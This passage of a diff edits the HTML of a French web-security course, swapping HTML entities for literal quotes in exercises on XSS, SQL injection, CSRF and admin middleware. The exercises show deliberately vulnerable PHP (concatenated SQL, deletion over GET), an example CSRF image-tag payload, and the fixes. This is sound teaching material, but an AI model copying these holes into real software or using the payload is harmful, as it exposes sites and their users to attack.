-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="c1">// Échapper les caractères spéciaux avant tout affichage</span>
-    <span class="nv">$name</span>  <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>  <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span>
-    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span>
+    <span class="nv">$name</span>  <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span>  <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
 
-    <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Bonjour </span><span class="si">$name</span><span class="s2">&lt;/h2&gt;&quot;</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Votre email est </span><span class="si">$email</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Bonjour </span><span class="si">$name</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;p&gt;Votre email est </span><span class="si">$email</span><span class="s2">&lt;/p&gt;"</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 </code></pre></div>
 <p><strong>Alternative avec <code>strip_tags()</code></strong></p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$name  = strip_tags($_POST[&#39;name&#39;]);</span>
-<span class="x">$email = strip_tags($_POST[&#39;email&#39;]);</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$name  = strip_tags($_POST['name']);</span>
+<span class="x">$email = strip_tags($_POST['email']);</span>
 </code></pre></div>
 <p><strong>Différence entre les deux approches :</strong>
 | Fonction | Comportement | Usage conseillé |
@@ -7028,16 +7028,16 @@ Ce script sera interprété par le navigateur → <strong>XSS réfléchie</stron
 <h2 id="faille-11-les-guards-middleware">Faille 1.1 : Les Guards / Middleware<a class="headerlink" href="#faille-11-les-guards-middleware" title="Permanent link">⚓︎</a></h2>
 <p>L'auditeur vous demande d'observer le code PHP suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Routeur de l&#39;application</span>
+<span class="c1">// Routeur de l'application</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/facture&#39;</span><span class="p">,</span> <span class="s1">&#39;FactureController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/search'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/facture'</span><span class="p">,</span> <span class="s1">'FactureController@index'</span><span class="p">);</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">middleware</span><span class="p">([</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="s1">&#39;AdminController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">middleware</span><span class="p">([</span><span class="s1">'admin'</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="s1">'AdminController@index'</span><span class="p">);</span>
     <span class="c1">// …</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span> <span class="s1">&#39;UserController@index&#39;</span><span class="p">);</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin/users'</span><span class="p">,</span> <span class="s1">'UserController@index'</span><span class="p">);</span>
 <span class="p">});</span>
 </code></pre></div>
 <p>Il vous demande d'expliquer le rôle du guard / middleware <code>admin</code> ?</p>
@@ -7051,17 +7051,17 @@ Ce script sera interprété par le navigateur → <strong>XSS réfléchie</stron
 <p><strong>Ajout de la route <code>/admin/factures</code></strong></p>
 <p>Il suffit d'ajouter la nouvelle route <strong>à l'intérieur</strong> du groupe middleware <code>admin</code> :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Routeur de l&#39;application</span>
+<span class="c1">// Routeur de l'application</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/facture&#39;</span><span class="p">,</span> <span class="s1">&#39;FactureController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/search'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/facture'</span><span class="p">,</span> <span class="s1">'FactureController@index'</span><span class="p">);</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">middleware</span><span class="p">([</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="s1">&#39;AdminController@index&#39;</span><span class="p">);</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span> <span class="s1">&#39;UserController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">middleware</span><span class="p">([</span><span class="s1">'admin'</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="s1">'AdminController@index'</span><span class="p">);</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin/users'</span><span class="p">,</span> <span class="s1">'UserController@index'</span><span class="p">);</span>
     <span class="c1">// Nouvelle route protégée par le middleware admin</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin/factures&#39;</span><span class="p">,</span> <span class="s1">&#39;FactureController@all&#39;</span><span class="p">);</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin/factures'</span><span class="p">,</span> <span class="s1">'FactureController@all'</span><span class="p">);</span>
 <span class="p">});</span>
 </code></pre></div>
 <p><strong>Méthode à créer dans <code>FactureController</code></strong></p>
@@ -7069,7 +7069,7 @@ Ce script sera interprété par le navigateur → <strong>XSS réfléchie</stron
 <span class="x">{</span>
 <span class="x">    // Récupère toutes les factures, tous utilisateurs confondus</span>
 <span class="x">    $factures = Facture::all();</span>
-<span class="x">    return view(&#39;admin.factures&#39;, [&#39;factures&#39; =&gt; $factures]);</span>
+<span class="x">    return view('admin.factures', ['factures' =&gt; $factures]);</span>
 <span class="x">}</span>
 </code></pre></div>
 <p><strong>Point clé :</strong> placer la route dans le groupe middleware garantit que la vérification du rôle est centralisée et ne peut pas être oubliée. Ne jamais vérifier le rôle uniquement côté vue (JavaScript / HTML) — la vérification doit <strong>toujours</strong> être côté serveur.</p>
@@ -7079,19 +7079,19 @@ Ce script sera interprété par le navigateur → <strong>XSS réfléchie</stron
 <p>Le code source ou la faille se trouve est le suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
-<span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE id = </span><span class="si">$id</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+<span class="nv">$request</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id = </span><span class="si">$id</span><span class="s2">"</span><span class="p">;</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
 <span class="x">    &lt;h1&gt;Exercice 2&lt;/h1&gt;</span>
-<span class="x">    &lt;p&gt;Vous devez corriger la faille d&#39;injection SQL&lt;/p&gt;</span>
-<span class="x">    &lt;p&gt;Voici les informations de l&#39;utilisateur&lt;/p&gt;</span>
+<span class="x">    &lt;p&gt;Vous devez corriger la faille d'injection SQL&lt;/p&gt;</span>
+<span class="x">    &lt;p&gt;Voici les informations de l'utilisateur&lt;/p&gt;</span>
 <span class="x">    &lt;ul&gt;</span>
-<span class="x">        &lt;li&gt;Nom : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
-<span class="x">        &lt;li&gt;Email : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
+<span class="x">        &lt;li&gt;Nom : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
+<span class="x">        &lt;li&gt;Email : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
 <span class="x">    &lt;/ul&gt;</span>
 <span class="x">&lt;/div&gt;</span>
 
@@ -7099,8 +7099,8 @@ Ce script sera interprété par le navigateur → <strong>XSS réfléchie</stron
 <span class="x">    Voici la liste des utilisateurs :</span>
 <span class="x">&lt;/p&gt;</span>
 
-<span class="x">-  &lt;a href=&quot;index.php?id=1&quot;&gt;Utilisateur 1&lt;/a&gt;</span>
-<span class="x">-  &lt;a href=&quot;index.php?id=2&quot;&gt;Utilisateur 2&lt;/a&gt;</span>
+<span class="x">-  &lt;a href="index.php?id=1"&gt;Utilisateur 1&lt;/a&gt;</span>
+<span class="x">-  &lt;a href="index.php?id=2"&gt;Utilisateur 2&lt;/a&gt;</span>
 </code></pre></div>
 <p>Proposez une solution pour corriger cette faille.</p>
 <details class="question">
@@ -7113,17 +7113,17 @@ Ce script sera interprété par le navigateur → <strong>XSS réfléchie</stron
 Cela permet d'extraire l'intégralité de la base de données (<strong>OWASP A03 : Injection</strong>).</p>
 <p><strong>Correction avec une requête préparée</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Valider que l&#39;id est bien un entier</span>
-<span class="nv">$id</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_GET</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_INT</span><span class="p">);</span>
+<span class="c1">// Valider que l'id est bien un entier</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_GET</span><span class="p">,</span> <span class="s1">'id'</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_INT</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nv">$id</span> <span class="o">===</span> <span class="k">false</span> <span class="o">||</span> <span class="nv">$id</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Identifiant invalide, on arrête</span>
     <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
-    <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Identifiant invalide&#39;</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s1">'Identifiant invalide'</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="c1">// Requête préparée : le paramètre est lié, jamais concaténé</span>
-<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE id = ?&quot;</span><span class="p">);</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE id = ?"</span><span class="p">);</span>
 <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$id</span><span class="p">]);</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
@@ -7139,19 +7139,19 @@ Cela permet d'extraire l'intégralité de la base de données (<strong>OWASP A03
 <p>L'auditeur a trouvé une faille de type Injection SQL. Observer le code source suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
-<span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE id = </span><span class="si">$id</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+<span class="nv">$request</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id = </span><span class="si">$id</span><span class="s2">"</span><span class="p">;</span>
 <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
 <span class="x">    &lt;h1&gt;Exercice 2&lt;/h1&gt;</span>
-<span class="x">    &lt;p&gt;Vous devez corriger la faille d&#39;injection SQL&lt;/p&gt;</span>
-<span class="x">    &lt;p&gt;Voici les informations de l&#39;utilisateur&lt;/p&gt;</span>
+<span class="x">    &lt;p&gt;Vous devez corriger la faille d'injection SQL&lt;/p&gt;</span>
+<span class="x">    &lt;p&gt;Voici les informations de l'utilisateur&lt;/p&gt;</span>
 <span class="x">    &lt;ul&gt;</span>
-<span class="x">        &lt;li&gt;Nom : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
-<span class="x">        &lt;li&gt;Email : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
+<span class="x">        &lt;li&gt;Nom : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
+<span class="x">        &lt;li&gt;Email : </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
 <span class="x">    &lt;/ul&gt;</span>
 <span class="x">&lt;/div&gt;</span>
 
@@ -7165,15 +7165,15 @@ Cela permet d'extraire l'intégralité de la base de données (<strong>OWASP A03
 <p>La préparation protège uniquement quand les données sont transmises <strong>via les paramètres liés</strong> (<code>?</code> ou <code>:param</code>).</p>
 <p><strong>Correction</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="nv">$id</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_GET</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_INT</span><span class="p">);</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_GET</span><span class="p">,</span> <span class="s1">'id'</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_INT</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
     <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
-    <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Identifiant invalide&#39;</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s1">'Identifiant invalide'</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="c1">// La valeur est passée en paramètre lié, pas dans la chaîne SQL</span>
-<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE id = ?&quot;</span><span class="p">);</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE id = ?"</span><span class="p">);</span>
 <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$id</span><span class="p">]);</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
@@ -7184,19 +7184,19 @@ Cela permet d'extraire l'intégralité de la base de données (<strong>OWASP A03
 <p>L'auditeur a trouvé une faille de type CSRF (Cross Site Request Forgery). Il a réussi via un email à faire supprimer des utilisateurs par l'administrateur de la plateforme.</p>
 <p>Le code source ou la faille se trouve est le suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;DELETE FROM user WHERE id = ?&quot;</span><span class="p">;</span>
-    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]]);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">"DELETE FROM user WHERE id = ?"</span><span class="p">;</span>
+    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]]);</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
 <span class="x">    &lt;h1&gt;Exercice 3&lt;/h1&gt;</span>
 <span class="x">    &lt;p&gt;Vous devez corriger la faille CSRF&lt;/p&gt;</span>
 <span class="x">    &lt;p&gt;Voici la liste des utilisateurs :&lt;/p&gt;</span>
 <span class="x">    &lt;ul&gt;</span>
-<span class="x">        &lt;li&gt;Utilisateur 1 &lt;a href=&quot;index.php?id=1&quot;&gt;Supprimer&lt;/a&gt;&lt;/li&gt;</span>
-<span class="x">        &lt;li&gt;Utilisateur 2 &lt;a href=&quot;index.php?id=2&quot;&gt;Supprimer&lt;/a&gt;&lt;/li&gt;</span>
+<span class="x">        &lt;li&gt;Utilisateur 1 &lt;a href="index.php?id=1"&gt;Supprimer&lt;/a&gt;&lt;/li&gt;</span>
+<span class="x">        &lt;li&gt;Utilisateur 2 &lt;a href="index.php?id=2"&gt;Supprimer&lt;/a&gt;&lt;/li&gt;</span>
 <span class="x">    &lt;/ul&gt;</span>
 <span class="x">&lt;/div&gt;</span>
 </code></pre></div>
@@ -7205,10 +7205,10 @@ Cela permet d'extraire l'intégralité de la base de données (<strong>OWASP A03
 <p>Le principe de la faille CSRF est de faire une requête à l'insu de l'utilisateur. Pour cela, il faut que l'utilisateur soit connecté à votre application. Ensuite, vous devez faire une requête à l'insu de l'utilisateur.</p>
 <p>Pour corriger cette faille, vous devez ajouter un token dans le formulaire (ou en SESSION). Ce token doit être généré aléatoirement et doit être vérifié lors de l'accès à la page.</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Génère un token aléatoire</span>
-<span class="x">$_SESSION[&#39;token&#39;] = bin2hex(random_bytes(32));</span>
+<span class="x">$_SESSION['token'] = bin2hex(random_bytes(32));</span>
 
 <span class="x">// Vérifier le token</span>
-<span class="x">if (isset($_POST[&#39;token&#39;]) &amp;&amp; $_POST[&#39;token&#39;] === $_SESSION[&#39;token&#39;]) {</span>
+<span class="x">if (isset($_POST['token']) &amp;&amp; $_POST['token'] === $_SESSION['token']) {</span>
 <span class="x">    // Le token est valide, nous pouvons traiter la requête</span>
 <span class="x">    // ...</span>
 <span class="x">}</span>
@@ -7219,7 +7219,7 @@ Cela permet d'extraire l'intégralité de la base de données (<strong>OWASP A03
 <summary>Éléments de correction</summary>
 <p><strong>Nature de la faille</strong></p>
 <p>La suppression s'effectue via une <strong>requête GET</strong> (<code>href="index.php?id=1"</code>). Un attaquant peut envoyer à l'administrateur un email contenant un lien ou une image comme :
-<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://monsite.com/index.php?id=1&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://monsite.com/index.php?id=1"</span><span class="p">&gt;</span>
 </code></pre></div>
 Le navigateur de l'admin charge l'image → la suppression est déclenchée à son insu.</p>
 <p>Deux problèmes cumulés :
@@ -7229,34 +7229,34 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="nb">session_start</span><span class="p">();</span>
 
-<span class="c1">// Générer le token CSRF à l&#39;affichage de la page</span>
-<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
+<span class="c1">// Générer le token CSRF à l'affichage de la page</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
 <span class="p">}</span>
 
 <span class="c1">// Traitement de la suppression uniquement en POST avec token valide</span>
-<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">hash_equals</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]))</span> <span class="p">{</span>
